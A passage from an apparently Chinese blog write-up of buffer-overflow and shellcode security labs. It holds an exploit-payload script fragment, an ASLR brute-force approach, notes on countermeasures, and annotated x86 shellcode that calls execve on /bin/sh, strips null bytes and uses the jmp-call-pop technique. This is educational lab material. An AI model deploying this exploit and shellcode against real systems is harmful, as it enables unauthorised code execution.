class="highlight python"><table><tr><td class="code"><pre><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x00007fffffffe490</span> + <span class="number">1200</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x00007fffffffe490</span> - <span class="number">0x00007fffffffe430</span> + <span class="number">8</span>           <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure><h2 id="Task-6-Experimenting-with-the-Address-Randomization"><a href="#Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task 6: Experimenting with the Address Randomization"></a>Task 6: Experimenting with the Address Randomization</h2><p>在 32 位程序中，只有 19 位地址可以被用作地址随机化，这个规模其实并不大，可以通过爆破的方式破 解。利用 Task 2 中的 shellcode 和 attack-code 目录下的 brute-forth.sh 脚本进行攻击，</p><h2 id="Task-7-Experimenting-with-Other-Countermeasures"><a href="#Task-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Task 7: Experimenting with Other Countermeasures"></a>Task 7: Experimenting with Other Countermeasures</h2><h3 id="2-7-1-StackGuard-保护机制"><a href="#2-7-1-StackGuard-保护机制" class="headerlink" title="2.7.1. StackGuard 保护机制"></a>2.7.1. StackGuard 保护机制</h3><p>进入 server-code 目录，编辑 Makefile ，去除 -fno-stack-protector 选项，</p><h3 id="2-7-2-不可执行栈"><a href="#2-7-2-不可执行栈" class="headerlink" title="2.7.2. 不可执行栈"></a>2.7.2. 不可执行栈</h3><p>进入 shellcode 文件夹，编辑 Makefile ，去除 -z execstack 选项，重新编译生成可执行文件，</p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>实验中共提到了三种栈溢出攻击的防御措施：</p><ul><li>开启地址随机化：开启后较难猜中想要跳转的地址，但是我们在Task6中通过爆破还是能攻击成功；</li><li>栈保护措施：开启后能检测到程序有栈溢出的风险，不允许执行。不保证能百分百检测出有栈溢出的点；</li><li>栈不可执行措施：将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。可以尝试ROP攻击。</li></ul><h1 id="Lab5-Shellcode"><a href="#Lab5-Shellcode" class="headerlink" title="Lab5-Shellcode"></a>Lab5-Shellcode</h1><blockquote><p>编译链接→查看机器码→将机器码复制进脚本文件中→运行生成shellcode</p><p>Shellcode要求机器码不能存在0：自身异或；字节含0采用移位操作；#填充</p><p>为系统参数提供调用，execve()构造数组，最终按顺序入栈</p><p>为execve()提供环境变量：构造字符串，存储字符串地址→构造数组，存储数组地址→构造环境变量数组，存储地址</p><p>使用shellcode</p></blockquote><h2 id="Task-1-Writing-Shellcode"><a href="#Task-1-Writing-Shellcode" class="headerlink" title="Task 1: Writing Shellcode"></a>Task 1: Writing Shellcode</h2><p>Invoking execve(“&#x2F;bin&#x2F;sh”, argv, 0)</p><ul><li>–<strong>eax</strong> &#x3D; 0x0b: execve() system call number</li><li>–<strong>ebx</strong> &#x3D; <u>address</u> of the command string “&#x2F;bin&#x2F;sh”</li><li>–<strong>ecx</strong> &#x3D; <u>address</u> of the argument array argv</li><li>–<strong>edx</strong> &#x3D; <u>address</u> of environment variables (set to 0)</li></ul><h3 id="Task1-a-The-Entire-Process"><a href="#Task1-a-The-Entire-Process" class="headerlink" title="Task1.a.The Entire Process"></a>Task1.a.The Entire Process</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">  ; 定义代码段开始</span><br><span class="line"></span><br><span class="line">  global _start</span><br><span class="line">    ; 声明_start标号为全局可见，_start是程序的入口点</span><br><span class="line">  _start:</span><br><span class="line">    ; 程序的入口点</span><br><span class="line"></span><br><span class="line">    ; 存储参数字符串到栈上</span><br><span class="line">    xor  eax, eax       ; 将eax寄存器与自身进行异或操作，将eax寄存器清零</span><br><span class="line">    push eax            ; 压入0作为字符串的结尾标志</span><br><span class="line">    push &quot;//sh&quot;         ; 压入字符串&quot;//sh&quot;，作为要执行的程序的参数之一</span><br><span class="line">    push &quot;/bin&quot;      ; 压入字符串&quot;/bin&quot;，作为要执行的程序的参数之一</span><br><span class="line">    mov  ebx, esp       ; 将esp寄存器的值（指向字符串&quot;/bin//sh&quot;的地址）赋给ebx寄存器，用于后续执行execve系统调用时指定要执行的程序路径</span><br><span class="line"></span><br><span class="line">    ; 构建参数数组argv[]</span><br><span class="line">    push eax       ; 压入0作为argv[]数组的第二个元素（argv[1]）的值，表示参数数组的结束</span><br><span class="line">    push ebx       ; 压入ebx寄存器的值（指向字符串&quot;/bin//sh&quot;的地址），作为argv[]数组的第一个元素（argv[0]）的值，表示要执行的程序的路径</span><br><span class="line">    mov  ecx, esp  ; 将esp寄存器的值（指向argv[]数组的地址）赋给ecx寄存器，用于后续执行execve系统调用时指定参数数组的地址</span><br><span class="line"></span><br><span class="line">    ; 环境变量</span><br><span class="line">    xor  edx, edx   ; 将edx寄存器与自身进行异或操作，将edx寄存器清零，表示没有环境变量</span><br><span class="line"></span><br><span class="line">    ; 调用execve()</span><br><span class="line">    xor  eax, eax   ; 将eax寄存器与自身进行异或操作，将eax寄存器清零</span><br><span class="line">    mov   al, 0x0b  ; 将值0x0b（11的十六进制表示）赋给al（EAX的低八位）寄存器，表示要执行的系统调用编号为11，即execve（ `eax` = 11，是 `execve` 系统调用的编号）</span><br><span class="line">    int 0x80       ; 触发软中断，进入内核模式执行系统调用</span><br></pre></td></tr></table></figure><p>最后两行用于触发系统中断，int 0x80 是一个常用的方式来触发系统调用。<em><strong>0x80 是系统调用的中断号</strong></em>，它告诉操作系统执行特定的系统调用功能。接下来，操作系统会根据 eax 寄存器的值来确定要执行哪个系统调用，而其他寄存器则用于传递参数和返回结果。</p><h3 id="Task1-b-Eliminating-Zeros-0x00-from-the-code"><a href="#Task1-b-Eliminating-Zeros-0x00-from-the-code" class="headerlink" title="Task1.b.Eliminating Zeros(0x00) from the code"></a>Task1.b.Eliminating Zeros(0x00) from the code</h3><blockquote><p>shellcode 广泛用于缓冲区溢出攻击。<strong><u><em>但很多情况下，攻击会因为字符串复制而失败，例如strcpy()函数。对于这些字符串复制函数，零被视为字符串的结尾</em></u></strong>。因此，如果我们在 shellcode 中间有一个零，字符串复制将无法将零之后的任何内容从该 shellcode 复制到目标缓冲区，因此攻击将无法成功。尽管并非所有Shellcode都存在零问题，但 shellcode 要求机器码中不能有任何零；否则，shellcode的应用将会受到限制。</p></blockquote><p>在缓冲区溢出攻击中我们利用了strcpy函数不检查数组边界的特性，但是它会检查字符串结尾符(0x00)，在复制过程中遇到0就会终止。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 11.05.52.png" alt="截屏2025-01-02 11.05.52" style="zoom:50%;" /><p><strong>提示</strong>：<u>下面举例三个在shellcode中去掉\x00的方法：</u></p><ul><li><p>上图中第1、2、3个（自上而下数）下划线处都是通过**<code>xor</code>操作将寄存器的值置为0**，而不是直接使用<code>mov</code>指令，如果使用<code>mov</code>指令，那么机器码必然包含<code>0x00</code>。</p></li><li><p>第4个下划线处的作用是将**<code>0x0b</code>赋值给al(eax的低8位)**，这样<code>eax</code>的值就为<code>0x0000000b</code>，如果用<code>mov eax,0x0b</code>，那么实际的操作数其实是<code>0x0000000b</code>，在内存中有三个<code>0x00</code>。</p></li><li><p>还有一种避免出现0x00的方法就是“<strong>位移</strong>”。</p><p>如果要将<code>0x007A7978</code>赋值给ebx，如果直接使用mov指令，那么机器码中必然会出现0x00。但是可以先用一个字节的占位符#，即把<code>0x237A7978</code>值赋值给ebx，然后再让ebx左移8位然后又右移8位，这样最终ebx的值会从<code>0x237A7978</code>变成<code>0x007A7978</code>，但是整个指令的机器码中不会含有0x00。</p></li></ul><p><strong>要求</strong>：将执行**&#x2F;bin&#x2F;sh<strong>改为执行</strong>&#x2F;bin&#x2F;bash**，但是不能通过加多余斜杠的方式来使得补齐push的四字节。</p><ul><li>我们需要构造出&#x2F;bin&#x2F;bash\0的字符串</li><li>由于直接使用0会导致strcpy失败，因此可以使用移位操作获取0</li><li>注意到push的操作数只能是32位&#x2F;64位数</li></ul><p><strong>分析</strong>：我们选择<code>#</code>作为填充字符，然后通过移位的方式得到0,</p><p>&#x2F;bin&#x2F;bash一共九个字节，而push是以四个字节为单位进栈的（push必须接32位的数）。如果直接push ‘h’（“&#x2F;bin”和“&#x2F;bas”为四个字节，“h”需要另外push）会导致最终的机器码中存在0x00。</p><p>那么我们可以采用<strong>位移</strong>的方式解决这个问题。</p><p>使用三个占位符#，将’h###’赋值给ecx，然后对让ecx先左移24位然后又右移24位，再push ecx即可。</p><p><strong>修改如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax, eax;eax异或清零</span><br><span class="line">mov eax, &quot;h###&quot;;eax=23232368</span><br><span class="line">shl eax, 24;左移24位，eax=68000000</span><br><span class="line">shr eax, 24;右移24位eax=00000068=h\0</span><br><span class="line">push eax</span><br><span class="line">push &quot;/bas&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov  ebx, esp     ; Get the string address</span><br><span class="line">xor eax, eax;eax异或清零作为参数argv[1]</span><br></pre></td></tr></table></figure><h3 id="Task1-c-Providing-Arguments-for-System-Calls"><a href="#Task1-c-Providing-Arguments-for-System-Calls" class="headerlink" title="Task1.c.Providing Arguments for System Calls"></a>Task1.c.Providing Arguments for System Calls</h3><p><strong>要求</strong>：在本实验中，运行命令： <code>/bin/sh -c &quot;ls -la&quot;</code>，需要我们为系统调用提供参数。</p><p>即：使用execve实现以下命令的执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh -c <span class="string">&quot;ls -la&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>我们想用execve函数执行&#x2F;bin&#x2F;sh -c ls -la，那么我们传入execve的参数应该为:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">argv[3] = 0</span><br><span class="line">argv[2] = <span class="string">&quot;ls -la&quot;</span></span><br><span class="line">argv[1] = <span class="string">&quot;-c&quot;</span></span><br><span class="line">argv[0] = <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><p>所以我们先将这些字符串压入栈，通过esp寄存器获得每个字符串的起始位置，最后在依次压入栈调用函数即可。</p><p>注意，需要避免机器码中出现0x00，所以当push的值不足4字节的时候需要使用位移的方法**。**</p></blockquote><p><strong>分析</strong>：对参数进行拆分，需要0x00截止符的时候就通过移位或者补充斜杠来获得；</p><p>函数在堆栈中传参的顺序是代码中相反的参数顺序（从右向左），先传<code>la</code>，再传<code>ls -</code>，即<code>argv[3] = 0 ；argv[2] = &quot;ls -la&quot; ；argv[1] = &quot;-c&quot; ；argv[0] = &quot;/bin/sh</code>；</p><ul><li><code>argv[0]</code> 通常是程序本身的名称，这里是 “&#x2F;bin&#x2F;sh”</li><li><code>argv[1]</code> 是 <code>&quot;-c&quot;</code>，告诉 shell 执行后续的命令字符串</li><li><code>argv[2]</code> 是 <code>&quot;ls -la&quot;</code>，这是要被执行的具体命令</li><li><code>argv[3]</code> 是 <code>NULL</code>，表示参数数组的结束</li></ul><p>函数调用时，参数先入栈，然后返回地址才入栈，除非有恢复现场的要求，shellcode可以不用管函数返回的问题；先构造一个参数字符串，压入栈，将地址放入一个通用寄存器，最后将所有参数的地址一并压入栈中（参数逆序压栈）；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      push &quot;//sh&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      mov ecx, &quot;-c##&quot;</span><br><span class="line">      shl ecx, 16</span><br><span class="line">      shr ecx, 16</span><br><span class="line">      push ecx</span><br><span class="line">      mov ecx, esp</span><br><span class="line"></span><br><span class="line">      mov edx, &quot;la##&quot;</span><br><span class="line">      shl edx, 16</span><br><span class="line">      shr edx, 16</span><br><span class="line">      push edx</span><br><span class="line">      push &quot;ls -&quot;</span><br><span class="line">      mov edx, esp</span><br><span class="line"></span><br><span class="line">      push eax                ; 将0压入栈，作为argv[3]的终止符</span><br><span class="line">      push edx                ; 将&quot;ls-la&quot;的地址压入栈，作为argv[2]</span><br><span class="line">      push ecx                ; 将&quot;-c&quot;的地址压入栈，作为argv[1]</span><br><span class="line">      push ebx                ; 将&quot;/bin//sh&quot;的地址压入栈，作为argv[0]</span><br><span class="line">      mov ecx, esp            ; 将栈顶地址（即argv[]数组的地址）移动到ECX寄存器</span><br><span class="line">        </span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure><h3 id="Task1-d-Providing-Environment-Variables-for-execve"><a href="#Task1-d-Providing-Environment-Variables-for-execve" class="headerlink" title="Task1.d.Providing Environment Variables for execve()"></a>Task1.d.Providing Environment Variables for execve()</h3><p>要编写这样的 shellcode，我们需要在栈上构建一个环境变量数组，并将该数组的地址存储到 edx 寄存器中，然后调用 execve()。在栈上构建此数组的方式与构建 argv[] 数组的方式完全相同。基本上，我们首先将实际的环境变量字符串存储在栈上。每个字符串的格式为 name&#x3D;value，并以零字节结尾。我们需要获取这些字符串的地址。然后，我们在栈上构建环境变量数组，并**<u>将字符串的地址</u>**存储在该数组中。该数组应如下所示（元素 0、1 和 2 的顺序无关紧要）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span>[3] = 0 // 0 marks the end of the array</span><br><span class="line"><span class="built_in">env</span>[2] = address to the <span class="string">&quot;cccc=1234&quot;</span> string</span><br><span class="line"><span class="built_in">env</span>[1] = address to the <span class="string">&quot;bbb=5678&quot;</span> string</span><br><span class="line"><span class="built_in">env</span>[0] = address to the <span class="string">&quot;aaa=1234&quot;</span> string</span><br></pre></td></tr></table></figure><p>将<code>/usr/bin/env</code>分别入栈，在所有操作完成后，<code>eax</code>用于传入参数0，<code>ebx</code>应该指向字符串参数<code>/usr/bin/env</code>，<code>ecx</code>应该指向参数数组的地址，所以这三个寄存器在后面定义环境变量时不能再使用，于是使用还未使用过的esi、edi、ebp和edx寄存器；对于环境变量部分，需要将三个变量依次入栈后，再将对应的地址入栈；</p><p><strong>代码</strong>：（高地址先入栈）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      push &quot;/env&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      push &quot;/usr&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/usr/bin/env&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line">   </span><br><span class="line">      ; For environment variable </span><br><span class="line">      ; 设置第一个环境变量</span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax</span><br><span class="line">      mov eax, &quot;###4&quot;     </span><br><span class="line">      shr eax, 24</span><br><span class="line">      push eax</span><br><span class="line">      push &quot;=123&quot;       </span><br><span class="line">      push &quot;cccc&quot;      </span><br><span class="line">      mov esi, esp          ; 将环境变量的地址保存到ESI</span><br><span class="line"></span><br><span class="line">      ; 设置第二个环境变量</span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax</span><br><span class="line">      push &quot;5678&quot;       </span><br><span class="line">      push &quot;bbb=&quot;      </span><br><span class="line">      mov edi, esp          ; 将环境变量的地址保存到EDI</span><br><span class="line"></span><br><span class="line">      ; 设置第三个环境变量</span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax</span><br><span class="line">      push &quot;1234&quot;       </span><br><span class="line">      push &quot;aaa=&quot;       </span><br><span class="line">      mov ebp, esp          ; 将环境变量的地址保存到EBP</span><br><span class="line"></span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax              ; push 0</span><br><span class="line">      push esi              ; push env[2] &quot;cccc=1234&quot;</span><br><span class="line">      push edi              ; push env[1] &quot;bbb=5678&quot;</span><br><span class="line">      push ebp              ; push env[0] &quot;aaa=1234&quot;</span><br><span class="line">      mov edx, esp          ; 将环境变量数组的地址保存到EDX</span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure><p><strong>举一反三</strong>：经过尝试发现，可以在将<code>/usr/bin/env</code>参数入栈前就将环境变量入栈，这样在环境变量入栈时可以使用<code>ebx、ecx</code>等寄存器，不影响后面<code>ebx</code>等寄存器的赋值，</p><p>代码修改如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      mov eax, &quot;###4&quot;     </span><br><span class="line">      shr eax, 24</span><br><span class="line">      push eax</span><br><span class="line">      push &quot;=123&quot;       </span><br><span class="line">      push &quot;cccc&quot;      </span><br><span class="line">      mov ebx, esp          ; 将环境变量的地址保存到EBX</span><br><span class="line"></span><br><span class="line">      ; 设置第二个环境变量</span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax</span><br><span class="line">      push &quot;5678&quot;       </span><br><span class="line">      push &quot;bbb=&quot;      </span><br><span class="line">      mov ecx, esp          ; 将环境变量的地址保存到ECX</span><br><span class="line"></span><br><span class="line">      ; 设置第三个环境变量</span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax</span><br><span class="line">      push &quot;1234&quot;       </span><br><span class="line">      push &quot;aaa=&quot;       </span><br><span class="line">      mov edx, esp          ; 将环境变量的地址保存到EDX</span><br><span class="line">    </span><br><span class="line">      push eax</span><br><span class="line">      push ebx</span><br><span class="line">      push ecx</span><br><span class="line">      push edx</span><br><span class="line">      mov edx, esp</span><br><span class="line">      </span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      push &quot;/env&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      push &quot;/usr&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/usr/bin/env&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure><h2 id="Task-2-Using-Code-Segment"><a href="#Task-2-Using-Code-Segment" class="headerlink" title="Task 2: Using Code Segment"></a>Task 2: Using Code Segment</h2><blockquote><p>在Task 1中，都是通过动态地压入栈，通过esp获得数据的地址。</p><p>但还有一种办法，即：将数据储存在代码区，并通过函数的调用机制获得其地址（另一种通过记录参数地址的方法，即将所有参数都放入一个字符串中，通过将字符串作为函数调用时的返回地址的方式将这个字符串压入栈中）。Task 2就是介绍此方法。</p></blockquote><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 12.06.52.png" alt="截屏2025-01-02 12.06.52" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">one:</span><br><span class="line"> pop ebx; 将栈中最顶层的值弹出装入ebx中</span><br><span class="line"> xor eax, eax; eax异或清零</span><br><span class="line"> mov [ebx+7], al; 将al（EAX的低八位）的值装入ebx的值加上7所指向的地址中</span><br><span class="line"> mov [ebx+8], ebx ; 将ebx的值装入ebx的值加上8所指向的地址中</span><br><span class="line"> mov [ebx+12], eax; 将eax的值装入ebx的值加上12的所指向的地址中</span><br><span class="line"> lea ecx, [ebx+8]; 使得ecx=ebx+8的地址</span><br><span class="line"> xor edx, edx; edx异或清零</span><br><span class="line"> mov al,  0x0b; 给al赋值0x0b</span><br><span class="line"> int 0x80; 中断，为该程序实现系统调用</span><br><span class="line">two:</span><br><span class="line"> call one; call将函数one压入栈中，再跳转到函数one</span><br><span class="line"> db &#x27;/bin/sh*AAAABBBB&#x27;;存储字符串,调用函数时会压入栈作为返回地址</span><br></pre></td></tr></table></figure><ol><li>程序先<code>jmp short two</code>开始执行two函数，进入two后又调用了one</li><li>call调用的下一条语句是存储了一个字符串，**<u><em>调用函数时会将下一条语句的地址压入栈作为返回地址，因此字符串的地址被压入栈；</em></u>**</li><li>到了one函数中，调用了pop把栈顶(字符串的地址)取出并放入了ebx中，这样就获取到了字符串的地址；</li><li>后面内容与mysh.s类似，将字符串中的*占位符和参数1用0覆盖，将ecx指向参数地址，为eax赋值11(execve的调用值)。</li></ol><p><strong>（1）  从第七行开始逐行解释代码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop ebx                ; 弹出栈顶的值放入ebx中</span><br><span class="line">xor eax, eax           ; eax置0</span><br><span class="line">mov [ebx+7], al        ; 字符串的第七个位置的*变成0，相当于将&quot;/bin/sh&quot;分割出来，这样ebx指向的就是&quot;/bin/sh&quot;这一个字符串</span><br><span class="line">mov [ebx+8], ebx     ; 将ebx的值（字符串的地址）存在字符串的第八个位置处，占据四个字节（32位）</span><br><span class="line">mov [ebx+12], eax    ; 字符串的第十二个位置变成0，相当于将ebx的值（字符串的地址）分割出来</span><br><span class="line">lea ecx, [ebx+8]     ; 让ecx指向字符串中存着的ebx的值（字符串的地址）的位置</span><br><span class="line">xor edx, edx         ; 将edx的值变成0，因为没有环境变量</span><br></pre></td></tr></table></figure><p>第7行：将当前栈顶的值弹出，赋给ebx。因为运行call之后，操作系统会自动将call的下一条指令的地址压入栈，而该地址正好是字符串的地址，通过第7行代码将字符串的地址传入ebx，以便进行下一步操作。</p><p>第8行：将eax置零。</p><p>第9行：将一个字节<code>0x0</code>存储到ebx+7的位置，因为ebx是字符串的地址，那么ebx+7的位置处存储的内容刚好对应字符串中的*占位符，这样做的目的是使用0隔断符截断字符串，使操作系统从ebx读取&#x2F;bin&#x2F;sh就结束，不多读取。</p><p>第10行：将ebx的值(字符串的地址)，放在ebx+8的内存位置。相当Task 1中将argv[0]压入栈。</p><p>第11行：将ebx+12地址上的值置为0，相当于Task 1中将argv[1]压入栈，argv[1]的值为0，表示参数数组argv的结束。</p><p>第12行：使得ecx &#x3D; ebx +8，使得ecx的值指向数组argv[]，满足exceve函数的传参（ecx传递argv的地址）。</p><p>第13行：使得edx为0，满足exceve函数的传参：edx为envp[]的指针，这里为Null表示没有环境变量。</p><p>第14、15行：触发系统中断，int 0x80 是一个常用的方式来触发系统调用。<em><strong>0x80 是系统调用的中断号</strong></em>，它告诉操作系统执行特定的系统调用功能。接下来，操作系统会根据 eax 寄存器的值来确定要执行哪个系统调用，而其他寄存器则用于传递参数和返回结果。</p><p><strong>为什么栈顶就直接是返回地址而不是父函数的ebp和局部变量呢？</strong></p><blockquote><p>在 x86 汇编中，返回地址之上是否有调用函数的 <code>ebp</code> 和局部变量，取决于调用约定和函数内部具体如何设置栈帧。对于你的示例代码，这种情况并没有发生，主要有以下几个原因：</p><hr><p><strong>1. 没有栈帧的建立</strong></p><p>在标准的 x86 函数调用中，通常会通过 <code>call</code> 和 <code>ret</code> 指令来配合栈帧建立和销毁。以下是常见的栈帧设置流程：</p><ol><li><strong><code>call</code> 指令</strong>：压入返回地址。</li><li>进入函数后：<ul><li>保存调用者的 <code>ebp</code>（通常是 <code>push ebp</code>）。</li><li>将当前栈顶设置为 <code>ebp</code>（<code>mov ebp, esp</code>）。</li><li>为局部变量腾出空间（<code>sub esp, n</code>，<code>n</code> 是局部变量所需的字节数）。</li></ul></li></ol><p>但是在你的示例代码中，函数 <code>one</code> 没有显式地建立栈帧，也没有保存 <code>ebp</code> 或分配局部变量。以下是 <code>one</code> 的代码片段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">one:</span><br><span class="line">    pop ebx         ; 从栈顶弹出返回地址</span><br><span class="line">    xor eax, eax    ; 清零 eax</span><br><span class="line">    mov [ebx+7], al ; 写入地址</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>从这段代码可以看出，<code>one</code> 没有使用 <code>push ebp</code> 和 <code>mov ebp, esp</code> 等指令，因此没有建立标准的栈帧。</p><hr><p><strong>2. 为什么没有 <code>ebp</code> 或局部变量</strong></p><p>这是因为这段代码特意设计为最小化开销的低级汇编程序，完全省略了栈帧的管理。这种情况常见于以下场景：</p><ul><li><strong>轻量级函数调用</strong>：代码只需要简单操作栈上的数据，并不涉及复杂的局部变量和参数管理。</li><li><strong>系统调用或漏洞利用场景</strong>：代码的目的是尽可能精简，减少不必要的栈帧开销。</li></ul><p>由于 <code>one</code> 的实现中没有 <code>push ebp</code> 或分配局部变量的操作，因此调用函数的 <code>ebp</code> 和局部变量不会出现在返回地址的上方。</p><hr><p><strong>3. 栈布局分析</strong></p><p>假设在调用 <code>one</code> 前，栈上的布局如下（高地址 -&gt; 低地址）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[局部变量或其它数据]  &lt;- (可能的) 调用函数的局部变量</span><br><span class="line">[调用者的 ebp]        &lt;- 如果调用者有标准栈帧</span><br><span class="line">[返回地址]            &lt;- `call one` 自动压入</span><br></pre></td></tr></table></figure><p>进入 <code>one</code> 函数后：</p><ul><li><strong>没有栈帧</strong>：函数 <code>one</code> 没有保存调用者的 <code>ebp</code>，直接操作返回地址（通过 <code>pop ebx</code>）。</li><li><strong>局部变量没有分配空间</strong>：代码完全在现有栈数据上工作，不分配额外空间。</li></ul><p>因此，栈的实际操作仅限于返回地址及其后续的数据（如 <code>&quot;/bin/sh*AAAABBBB&quot;</code>）。</p><hr><p><strong>总结</strong></p><ol><li>返回地址的上方没有调用函数的 <code>ebp</code> 和局部变量，是因为 <code>one</code> 函数没有建立栈帧。</li><li>这是有意设计的简化代码逻辑，主要为了实现高效的系统调用（或漏洞利用）。</li><li>这种代码风格在嵌入式开发或低级系统操作中较为常见。</li></ol></blockquote><p><strong>（2）  实现&#x2F;usr&#x2F;bin&#x2F;env并打印a&#x3D;11 b&#x3D;22</strong></p><p><strong>(思路一：a,b直接当成环境变量传入)</strong></p><p>要实现该功能的命令为：<code>/usr/bin/env - a=11 b=22</code></p><p><strong>分析</strong>：AAAA存放<code>a=11</code>的地址，BBBB存放<code>b=22</code>的地址，CCCC存放<code>env[2]=0</code>（将0压入栈，作为env[]的终止符），DDDD存放<code>usr/bin/env</code>的地址，EEEE存放<code>argv[1]=0</code>（将0压入栈，作为argv的终止符），表示argv数组结尾。然后还要把ecx设为&amp;argv[0]，满足对execve函数传参的时候；将edx设置为0，表示没有环境变量（可省略）。</p><p>需要注意<code>mov</code>和<code>lea</code>助记符的区别</p><blockquote><ol><li><strong>MOV指令（数据传送指令）:</strong></li></ol><p>MOV指令主要用于在寄存器或内存之间传输数据。它可以将源操作数（source operand）的值复制到目标操作数（destination operand）。例如，MOV AX, [BX]这条指令将会<strong>把内存地址[BX]处的值</strong>加载到AX寄存器中。</p><p>MOV指令不会改变源操作数的值，它只是复制这个值到目标操作数。</p><ol start="2"><li><strong>LEA指令（加载有效地址）:</strong></li></ol><p>LEA指令用于加载有效地址（Effective Address）到目标寄存器中。有效地址通常是由一个或多个寄存器或内存地址组成的复杂表达式的结果。LEA指令计算这个表达式的值，并将结果（即<strong>有效地址</strong>）存储到目标寄存器中，而不会去访问或修改该地址处的内存内容。</p><p>例如，LEA AX, [BX+SI]这条指令将会计算BX和SI寄存器之和，并将结果（<strong>有效地址</strong>）加载到AX寄存器中，而不会读取该地址处的内存值。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">BITS 32</span><br><span class="line">jmp short two</span><br><span class="line">one:</span><br><span class="line">pop ebx</span><br><span class="line">xor eax, eax</span><br><span class="line">mov [ebx+12], eax</span><br><span class="line">mov [ebx+20], eax</span><br><span class="line">mov [ebx+28], eax; 将字符串内的*占位符都改为00截止符</span><br><span class="line"></span><br><span class="line">lea ecx, [ebx+16]</span><br><span class="line">mov [ebx+32], ecx; addr of env[0]=&quot;a=11\0&quot;</span><br><span class="line">lea ecx, [ebx+24]</span><br><span class="line">mov [ebx+36], ecx; addr of env[1]=&quot;b=22\0&quot;</span><br><span class="line">mov [ebx+40], eax; env[2]=0</span><br><span class="line">lea 